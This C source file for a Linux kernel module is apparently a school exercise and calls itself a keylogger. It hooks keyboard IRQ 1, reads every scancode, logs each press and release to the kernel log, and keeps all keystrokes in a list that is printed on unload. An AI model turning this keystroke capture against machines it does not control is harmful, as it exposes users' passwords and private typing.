#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/interrupt.h>
#include <linux/list.h>
#include <linux/slab.h>

#include "stroke.h"

static LIST_HEAD(strokehead);

/*
 * This variable is used as an identifier for shared interrupt lines.
 * Since many drivers can be loaded on the same line, free_irq needs
 * to know what driver it should free.
 * I set it to the address of strokehead, is it a good idea ?*/
static void *line_id = &strokehead;

static irqreturn_t irq_handler(int irq, void *dev_id)
{
	int scancode = inb(0x60);
	struct stroke_s *keystroke;

	keystroke = kmalloc(sizeof(struct stroke_s), GFP_ATOMIC);

	keystroke->state = scancode & 0x80;
	keystroke->value = scancode &= ~0x80;
	list_add_tail(&keystroke->list, &strokehead);
	if (keystroke->state)
		pr_info("Key = %d, RELEASED\n", keystroke->value);
	else
		pr_info("Key = %d, PRESSED\n", keystroke->value);
	return IRQ_HANDLED;
}

static int __init init_keyboard(void)
{
	int ret;

	pr_info("LOADED -- 42 keylogger module.\n");
	ret = request_irq(1,				\
			irq_handler,			\
			IRQF_SHARED,			\
			"my_keyboard_42",		\
			line_id);
	return 0;
}

static void __exit exit_keyboard(void)
{
	struct stroke_s *toto;
	struct stroke_s *tmp;

	list_for_each_entry_safe(toto, tmp, &strokehead, list)
	{
		printk("VALUE - %d\n", toto->value);
		kfree(toto);
	}
	free_irq(1, line_id);
	pr_info("UNLOADED -- 42 keylogger module.\n");
}

module_init(init_keyboard);
module_exit(exit_keyboard);

MODULE_LICENSE("Dual MIT/GPL");
MODULE_AUTHOR("agouby");
MODULE_DESCRIPTION("Keyboard driver, keylogger");
